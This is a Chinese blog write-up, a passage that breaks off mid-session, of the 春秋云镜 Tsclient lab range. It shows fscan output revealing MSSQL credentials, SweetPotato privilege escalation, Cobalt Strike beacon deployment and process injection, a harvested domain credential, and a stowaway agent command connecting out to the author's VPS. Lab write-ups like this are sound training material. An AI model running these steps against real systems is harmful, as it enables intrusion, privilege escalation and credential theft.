@@ -1,0 +1,800 @@
+<!doctype html><html lang=zh-cn><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>春秋云镜Tsclient - Twansh's blog</title><link rel=icon href=/logo.png><script>(function(){localStorage.removeItem("flavor-theme");var t=window.matchMedia("(prefers-color-scheme: dark)"),e=sessionStorage.getItem("flavor-theme-override");if(e==="light"||e==="dark"){document.documentElement.setAttribute("data-theme",e);return}document.documentElement.setAttribute("data-theme",t.matches?"dark":"light")})()</script><link rel=preload as=font type=font/woff2 href=/fonts/tsanger-jinkai02/20307ec77575b65807a8b0c5b7201f43.woff2 crossorigin><link rel=preload as=style href=/fonts/tsanger-jinkai02/result.css onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/fonts/tsanger-jinkai02/result.css></noscript><link rel=stylesheet href=/scss/main.min.f9483bf4231821718c79757993df7674f414a796ac0bd206f89cc6c81e39cb27.css><meta name=description content="包子王说这个很有趣，xrntkk师傅也说挺有意思的，但是这套靶场倒是把第一次打春秋云镜的我当日本人整了"><meta name=author content="Twansh"><meta name=robots content="index,follow,max-image-preview:large"><meta name=keywords content="Cyberspace Security,CTF,Web Security,Penetration Testing,Offensive,春秋云镜,内网渗透"><link rel=canonical href=https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Ctsclient/><meta property="og:site_name" content="Twansh's blog"><meta property="og:title" content="春秋云镜Tsclient - Twansh's blog"><meta property="og:description" content="包子王说这个很有趣，xrntkk师傅也说挺有意思的，但是这套靶场倒是把第一次打春秋云镜的我当日本人整了"><meta property="og:type" content="article"><meta property="og:url" content="https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Ctsclient/"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://3a0.top/logo.png"><meta property="og:image:alt" content="春秋云镜Tsclient"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="春秋云镜Tsclient - Twansh's blog"><meta name=twitter:description content="包子王说这个很有趣，xrntkk师傅也说挺有意思的，但是这套靶场倒是把第一次打春秋云镜的我当日本人整了"><meta name=twitter:image content="https://3a0.top/logo.png"><meta property="article:published_time" content="2025-09-02T20:51:26Z"><meta property="article:modified_time" content="2025-09-02T20:51:26Z"><meta property="article:section" content="Offensive"><meta property="article:tag" content="春秋云镜"><meta property="article:tag" content="内网渗透"><script type=application/ld+json>{"@context":"https://schema.org","@graph":[{"@id":"https://3a0.top/#website","@type":"WebSite","description":"Cyberspace Security / CTF / Web 安全，记录学习和生活。","inLanguage":"zh-cn","name":"Twansh's blog","url":"https://3a0.top/"},{"@id":"https://3a0.top/about/#author","@type":"Person","email":"eminemgcxwlp@gmail.com","name":"Twansh","sameAs":["https://github.com/GCXWLP"],"url":"https://3a0.top/about/"},{"@id":"https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Ctsclient/#article","@type":"BlogPosting","author":{"@id":"https://3a0.top/about/#author"},"dateModified":"2025-09-02T20:51:26Z","datePublished":"2025-09-02T20:51:26Z","description":"包子王说这个很有趣，xrntkk师傅也说挺有意思的，但是这套靶场倒是把第一次打春秋云镜的我当日本人整了","headline":"春秋云镜Tsclient","image":["https://3a0.top/logo.png"],"inLanguage":"zh-cn","isPartOf":{"@id":"https://3a0.top/#website"},"keywords":["Offensive","春秋云镜","内网渗透"],"mainEntityOfPage":"https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Ctsclient/","url":"https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Ctsclient/"},{"@id":"https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Ctsclient/#breadcrumb","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://3a0.top/","name":"Home","position":1},{"@type":"ListItem","item":"https://3a0.top/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Ctsclient/","name":"春秋云镜Tsclient","position":2}]}]}</script></head><body><nav class=navbar id=navbar><div class=navbar__inner><a class=navbar__brand href=/><span>Twansh's blog</span></a><div class=navbar__right><ul class=navbar__links id=nav-links><li><a href=/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<span>Links</span></a></li><li><a href=/travel/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
+<span>Travel</span></a></li></ul><button class=navbar__btn id=search-btn type=button aria-label=Search>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+</button>
+<button class=navbar__btn id=theme-toggle type=button aria-label="Toggle theme">
+<svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+<svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+</button>
+<button class="navbar__btn navbar__hamburger" id=hamburger type=button aria-label=Menu>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></nav><div class=site-content><div class=post-layout><article class="post-layout__content post-single"><header class=post-single__header><div class=post-single__meta><time datetime=2025-09-02 data-pagefind-meta=date[datetime]>Sep 02, 2025</time>
+<span class=sep>·</span>
+<span>23 min read</span>
+<span class=sep>·</span>
+<span>4882 words</span>
+<span class=sep>·</span>
+<a href=/categories/offensive/ class=post-single__category data-pagefind-filter=category>Offensive</a></div><h1 class=post-single__title data-pagefind-meta=title>春秋云镜Tsclient</h1></header><div class=article-content data-pagefind-body><h2 id=前情提要>前情提要</h2><p>开学之后沉迷于PUBG(没错我就是PUBG校长)，有三四天都没学东西了，之前的博客也是一拖再拖，没有动手去写，气得我一怒之下直接把PUBG所有可以售卖的枪皮统统出售，以警醒自己要保持学习</p><p>然后就是，需要掌握一门开发能力，今天(没错就是博客更新的今天)才意识到开发能力的重要性，暑假基本上没碰这一块，现在要抓紧补充起来了</p><h2 id=本期推荐>本期推荐</h2><p>Counter Attack-Mankind</p><h2 id=关于工具>关于工具</h2><p>倘若挨个去下载，挨个配置环境，那实在是有够麻烦的，所以此处推荐 onefox集成工具箱，我们在本章中需要的工具基本上都包含在里面了</p><h2 id=前期准备>前期准备</h2><p>安装好脚本和代理，提权工具若干，该传上去的就赶紧传上去</p><h2 id=flag1>flag1</h2><p>给了个IP:39.99.129.53</p><p>按照传统的CTF思路，应该是找点Nday来进行利用，但是在这里是进行内网渗透，所以我们需要使用点工具</p><h3 id=fscan扫描>fscan扫描</h3><p>先用fscan扫一遍</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>E:<span class=se>\C</span>TFFIT<span class=se>\O</span>NE-FOX集成工具箱_V8公开版_by狐狸<span class=se>\g</span>ui_scan<span class=se>\f</span>scan&gt;fscan -h 39.99.129.53
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   ___                              _
+</span></span><span class=line><span class=cl>  / _ <span class=se>\ </span>    ___  ___ _ __ __ _  ___<span class=p>|</span> <span class=p>|</span> __
+</span></span><span class=line><span class=cl> / /_<span class=se>\/</span>____/ __<span class=p>|</span>/ __<span class=p>|</span> <span class=err>&#39;</span>__/ _<span class=sb>`</span> <span class=p>|</span>/ __<span class=p>|</span> <span class=p>|</span>/ /
+</span></span><span class=line><span class=cl>/ /_<span class=se>\\</span>_____<span class=se>\_</span>_ <span class=se>\ </span><span class=o>(</span>__<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=p>|</span> <span class=p>|</span> <span class=o>(</span>__<span class=p>|</span>   &lt;
+</span></span><span class=line><span class=cl><span class=se>\_</span>___/     <span class=p>|</span>___/<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>  <span class=se>\_</span>_,_<span class=p>|</span><span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span><span class=se>\_\
+</span></span></span><span class=line><span class=cl>                     fscan version: 1.8.3
+</span></span><span class=line><span class=cl>start infoscan
+</span></span><span class=line><span class=cl>39.99.129.53:80 open
+</span></span><span class=line><span class=cl>39.99.129.53:1433 open
+</span></span><span class=line><span class=cl>39.99.129.53:135 open
+</span></span><span class=line><span class=cl>39.99.129.53:139 open
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>4</span>
+</span></span><span class=line><span class=cl>start vulscan
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>39.99.129.53
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>WIN-WEB
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.8.18
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>2001:0:348b:fb58:70:10f0:d89c:7eca
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://39.99.129.53       code:200 len:703    title:IIS Windows Server
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> mssql 39.99.129.53:1433:sa 1qaz!QAZ
+</span></span><span class=line><span class=cl>已完成 4/4
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 扫描结束,耗时: 23.3301899s
+</span></span></code></pre></div><p>发现一个mssql服务暴露出来了，还有他的用户和密码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>用户:sa
+</span></span><span class=line><span class=cl>密码:1qaz!QAZ
+</span></span></code></pre></div><h3 id=mdut连接>MDUT连接</h3><p>谈到数据库，那MDUT工具的利用就极其重要了</p><p>onefox工具箱中自带MDUT，直接使用即可<br><img class=article-content-image src=/image/tsclient.png fetchpriority=high decoding=async alt="alt text"><br>如图配置好之后，点击即可进行连接<br><img class=article-content-image src=/image/tsclient1.png loading=lazy decoding=async alt="alt text"><br>连接好之后直接激活组件(可通过命令执行查看)，激活之后进行甜土豆提权<br><a href=https://github.com/uknowsec/SweetPotato>sweetpotato下载地址</a><br>下载好甜土豆之后直接通过MDUT打上去(鼠标右键点击上传，别老是想着拖拽文件上传)</p><p>注意上传的目录<br><img class=article-content-image src=/image/tsclient2.png loading=lazy decoding=async alt="alt text"><br>传好之后验证一手<br>执行</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:/Users/Public/SweetPotato.exe -a <span class=s2>&#34;whoami&#34;</span>
+</span></span></code></pre></div><p><img class=article-content-image src=/image/tsclient3.png loading=lazy decoding=async alt="alt text"></p><p>为了方便，接下来通过甜土豆来上线CS</p><h3 id=上线cs>上线CS</h3><p>关于CS，我当时做了可是整整一天，尽管在工具箱中有CS客户端工具，但是需要部署在自己的vps上的东西呢?</p><p>所以我找了很久，后面xrntkk提醒我，Teamservr早就被打包好存在工具箱里了，我这才发现满大街找的东西就在眼皮子底下<br><img class=article-content-image src=/image/73b2e61b66b4e6d3bc75faf0e1b2997b.png loading=lazy decoding=async alt="alt text"><br>这里之所以把这个写出来，就是为了防止有人像我当时那样，浪费了那么多时间</p><p>关于CS的详细介绍，可以参考这篇狼组知识库<br><a href=https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html>CS介绍</a></p><p>关于CS的使用，参考这篇博客<br><a href=https://zhuanlan.zhihu.com/p/93618757>cs在pentest中的使用</a></p><p>连上去之后应该是这样子的<br><img class=article-content-image src=/image/tsclient4.png loading=lazy decoding=async alt="alt text"></p><p>然后生成怪东西<br>步骤如下<br><img class=article-content-image src=/image/tsclient5.png loading=lazy decoding=async alt="alt text"><br>依次点出这三个，具体怎么配置你就玩吧，反正教你生成payload的教程这么多(但是他们都没教你怎么打开，笑死了)<br><img class=article-content-image src=/image/tsclient6.png loading=lazy decoding=async alt="alt text"></p><p>sorry啊，上面的错了，你去这里点出那三个窗口，然后生成.exe文件<br><img class=article-content-image src=/image/tsclient7.png loading=lazy decoding=async alt="alt text"></p><p>然后在MDUT里面用甜土豆运行，然后就可以成功上线CS</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:/Users/Public/SweetPotato.exe -a <span class=s2>&#34;C:/Users/Public/beacon.exe&#34;</span>
+</span></span></code></pre></div><p>这里插播一句:直接运行C:/Users/Public/beacon.exe和运行C:/Users/Public/SweetPotato.exe -a &ldquo;C:/Users/Public/beacon.exe"的区别</p><p>你直接在MDUT运行C:/Users/Public/beacon.exe的话，你只能拿到mssql的权限</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>11/01 15:56:43<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> received output:
+</span></span><span class=line><span class=cl>nt service<span class=se>\m</span>ssqlserver
+</span></span></code></pre></div><p>而你用甜土豆运行的话，你就可以通过甜土豆提权得到system权限</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>11/01 16:06:42<span class=o>]</span> beacon&gt; shell C:<span class=se>\U</span>sers<span class=se>\P</span>ublic<span class=se>\S</span>weetPotato.exe -a C:<span class=se>\U</span>sers<span class=se>\P</span>ublic<span class=se>\b</span>eacon.exe
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:06:42<span class=o>]</span> <span class=o>[</span>*<span class=o>]</span> Tasked beacon to run: C:<span class=se>\U</span>sers<span class=se>\P</span>ublic<span class=se>\S</span>weetPotato.exe -a C:<span class=se>\U</span>sers<span class=se>\P</span>ublic<span class=se>\b</span>eacon.exe
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:06:42<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> host called home, sent: <span class=m>92</span> bytes
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:06:53<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> received output:
+</span></span><span class=line><span class=cl>Modifying SweetPotato by Uknow to support webshell
+</span></span><span class=line><span class=cl>Github: https://github.com/uknowsec/SweetPotato 
+</span></span><span class=line><span class=cl>SweetPotato by @_EthicalChaos_
+</span></span><span class=line><span class=cl>  Orignal RottenPotato code and exploit by @foxglovesec
+</span></span><span class=line><span class=cl>  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
+</span></span><span class=line><span class=cl>  PrintSpoofer discovery and original exploit by @itm4n
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Attempting NP impersonation using method PrintSpoofer to launch c:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\c</span>md.exe
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Triggering notification on evil PIPE <span class=se>\\</span>WIN-WEB/pipe/ce313253-509c-4737-9068-eb543f8a4637
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Server connected to our evil RPC pipe
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Duplicated impersonation token ready <span class=k>for</span> process creation
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Intercepted and authenticated successfully, launching program
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> CreatePipe success
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Command : <span class=s2>&#34;c:\Windows\System32\cmd.exe&#34;</span> /c C:<span class=se>\U</span>sers<span class=se>\P</span>ublic<span class=se>\b</span>eacon.exe 
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> process with pid: <span class=m>5984</span> created.
+</span></span></code></pre></div><p>同时也成功上线了有system权限的CS</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>11/01 16:08:50<span class=o>]</span> beacon&gt; shell whoami
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:08:50<span class=o>]</span> <span class=o>[</span>*<span class=o>]</span> Tasked beacon to run: whoami
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:08:50<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> host called home, sent: <span class=m>37</span> bytes
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:08:50<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> received output:
+</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
+</span></span></code></pre></div><p>这里不光上线cs，你还得传搭建内网代理的工具上去，等下要搭建内网代理</p><p>上线CS之后直接在Cobalt Strike中执行shell命令<br>通过tree命令看一下文件结构<br>发现不对劲，似乎是在system目录下<br>用</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>chdir
+</span></span></code></pre></div><p>验证一下<br>发现果然是在C:\Windows\System<br>接下来退到C:\ (发现退出来的时候居然不需要我们shell cd ..，只要cd .. 即可)<br>然后重新寻找</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>09/22 14:05:45<span class=o>]</span> beacon&gt; shell dir
+</span></span><span class=line><span class=cl><span class=o>[</span>09/22 14:05:45<span class=o>]</span> <span class=o>[</span>*<span class=o>]</span> Tasked beacon to run: dir
+</span></span><span class=line><span class=cl><span class=o>[</span>09/22 14:05:45<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> host called home, sent: <span class=m>34</span> bytes
+</span></span><span class=line><span class=cl><span class=o>[</span>09/22 14:05:45<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> received output:
+</span></span><span class=line><span class=cl> 驱动器 C 中的卷没有标签。
+</span></span><span class=line><span class=cl> 卷的序列号是 4659-5697
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> C:<span class=se>\ </span>的目录
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>2022/07/11  16:44    &lt;DIR&gt;          inetpub
+</span></span><span class=line><span class=cl>2022/05/12  17:17    &lt;DIR&gt;          PerfLogs
+</span></span><span class=line><span class=cl>2022/07/11  14:00    &lt;DIR&gt;          Program Files
+</span></span><span class=line><span class=cl>2022/07/11  13:58    &lt;DIR&gt;          Program Files <span class=o>(</span>x86<span class=o>)</span>
+</span></span><span class=line><span class=cl>2022/07/11  13:52    &lt;DIR&gt;          SQL Server
+</span></span><span class=line><span class=cl>2022/07/11  15:58    &lt;DIR&gt;          Users
+</span></span><span class=line><span class=cl>2025/09/22  13:07    &lt;DIR&gt;          Windows
+</span></span><span class=line><span class=cl>2022/07/11  13:15    &lt;DIR&gt;          迅雷下载
+</span></span><span class=line><span class=cl>2022/07/11  12:58    &lt;DIR&gt;          迅雷云盘
+</span></span><span class=line><span class=cl>               <span class=m>0</span> 个文件              <span class=m>0</span> 字节
+</span></span><span class=line><span class=cl>               <span class=m>9</span> 个目录 27,483,099,136 可用字节
+</span></span></code></pre></div><p>按照经验，应该是在Users目录下，进去之后果然找到了<br>图省事的话，可以直接type出flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>shell <span class=nb>type</span> C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\f</span>lag<span class=se>\f</span>lag01.txt
+</span></span></code></pre></div><p>得到了第一个flag</p><h2 id=flag2>flag2</h2><p>需要从入口机接着对内网进行渗透，包子王他搭建内网代理，搭建完成之后固然是方便的，但是搭建的过程是绝望的(完蛋啦)</p><h3 id=查看在线用户>查看在线用户</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>11/01 16:22:49<span class=o>]</span> beacon&gt; shell quser <span class=o>||</span> qwinst
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:22:49<span class=o>]</span> <span class=o>[</span>*<span class=o>]</span> Tasked beacon to run: quser <span class=o>||</span> qwinst
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:22:50<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> host called home, sent: <span class=m>46</span> bytes
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:22:50<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> received output:
+</span></span><span class=line><span class=cl> 用户名                会话名             ID  状态    空闲时间   登录时间
+</span></span><span class=line><span class=cl> john                  rdp-tcp#0           <span class=m>2</span>  运行中         <span class=m>49</span>  2025/11/1 15:33
+</span></span></code></pre></div><p>当前是系统权限，我们可以通过进程注入的方式切换到用户john(这个和Linux靶机中劫持pipe管道通信提权到root有点像)</p><p>这里就直接在system会话中点击查看进程，随便选一个进程注入，把我们之前制作的监听器注入进去，成功上线</p><p>查看挂载情况</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>11/01 16:44:59<span class=o>]</span> beacon&gt; shell net use
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:44:59<span class=o>]</span> <span class=o>[</span>*<span class=o>]</span> Tasked beacon to run: net use
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:44:59<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> host called home, sent: <span class=m>38</span> bytes
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:44:59<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> received output:
+</span></span><span class=line><span class=cl>会记录新的网络连接。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>状态       本地        远程                      网络
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------
+</span></span><span class=line><span class=cl>                       <span class=se>\\</span>TSCLIENT<span class=se>\C</span>              Microsoft Terminal Services
+</span></span><span class=line><span class=cl>命令成功完成。
+</span></span></code></pre></div><p>远程有挂载hhh，这个还和这套模拟一样的名字，查看内部文件</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>11/01 16:46:45<span class=o>]</span> beacon&gt; shell dir <span class=se>\\</span>TSCLIENT<span class=se>\C</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:46:45<span class=o>]</span> <span class=o>[</span>*<span class=o>]</span> Tasked beacon to run: dir <span class=se>\\</span>TSCLIENT<span class=se>\C</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:46:45<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> host called home, sent: <span class=m>47</span> bytes
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:46:47<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> received output:
+</span></span><span class=line><span class=cl> 驱动器 <span class=se>\\</span>TSCLIENT<span class=se>\C</span> 中的卷没有标签。
+</span></span><span class=line><span class=cl> 卷的序列号是 C2C5-9D0C
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=se>\\</span>TSCLIENT<span class=se>\C</span> 的目录
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>2022/07/12  10:34                <span class=m>71</span> credential.txt
+</span></span><span class=line><span class=cl>2022/05/12  17:04    &lt;DIR&gt;          PerfLogs
+</span></span><span class=line><span class=cl>2022/07/11  12:53    &lt;DIR&gt;          Program Files
+</span></span><span class=line><span class=cl>2022/05/18  11:30    &lt;DIR&gt;          Program Files <span class=o>(</span>x86<span class=o>)</span>
+</span></span><span class=line><span class=cl>2022/07/11  12:47    &lt;DIR&gt;          Users
+</span></span><span class=line><span class=cl>2022/07/11  12:45    &lt;DIR&gt;          Windows
+</span></span><span class=line><span class=cl>               <span class=m>1</span> 个文件             <span class=m>71</span> 字节
+</span></span><span class=line><span class=cl>               <span class=m>5</span> 个目录 30,039,609,344 可用字节
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:47:09<span class=o>]</span> beacon&gt; shell <span class=nb>type</span> <span class=se>\\</span>TSCLIENT<span class=se>\C\c</span>redential.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:47:09<span class=o>]</span> <span class=o>[</span>*<span class=o>]</span> Tasked beacon to run: <span class=nb>type</span> <span class=se>\\</span>TSCLIENT<span class=se>\C\c</span>redential.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:47:10<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> host called home, sent: <span class=m>63</span> bytes
+</span></span><span class=line><span class=cl><span class=o>[</span>11/01 16:47:10<span class=o>]</span> <span class=o>[</span>+<span class=o>]</span> received output:
+</span></span><span class=line><span class=cl>xiaorang.lab<span class=se>\A</span>ldrich:Ald@rLMWuy7Z!#
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Do you know how to hijack Image?
+</span></span></code></pre></div><p>xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#<br>这个很明显就是 <strong>域\用户名:密码</strong> 的意思<br>问我们知不知道如何去劫持镜像</p><h3 id=搭建内网代理>搭建内网代理</h3><p>通过MDUT传windows的stowaway的agent端到靶机上<br>同时传一份Linux的admin端到vps上<br>这里直接开启Linux上的admin端</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>linux_x64_admin -l <span class=m>1122</span>
+</span></span></code></pre></div><p>同时在system权限的cs会话中开启Windows的agent端</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>shell C:<span class=se>\U</span>sers<span class=se>\P</span>ublic<span class=se>\w</span>indows_x64_agent.exe -c 124.71.111.64:1122
+</span></span></code></pre></div><h3 id=扫描内网>扫描内网</h3><p>我们先前的内网代理搭建完了，然后我们可以通过CS上传fscan到靶机上，然后在代理服务器上进行扫描</p><p>代理服务器上输入shell进入类似Windows的powershell的命令行界面,然后去找放fscan的目录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>admin<span class=o>)</span> &gt;&gt; use <span class=m>0</span> 
+</span></span><span class=line><span class=cl><span class=o>(</span>node 0<span class=o>)</span> &gt;&gt; socks <span class=m>1123</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Trying to listen on 0.0.0.0:1123......
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Waiting <span class=k>for</span> agent<span class=err>&#39;</span>s response......
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Socks start successfully!
+</span></span><span class=line><span class=cl><span class=o>(</span>node 0<span class=o>)</span> &gt;&gt; shell
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Waiting <span class=k>for</span> response.....
+</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>°汾 10.0.14393<span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> <span class=m>2016</span> Microsoft Corporation¡£±£´̹ԐȨ<span class=o>{</span>¡£
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;cd ..
+</span></span><span class=line><span class=cl><span class=nb>cd</span> ..
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows&gt;cd ..
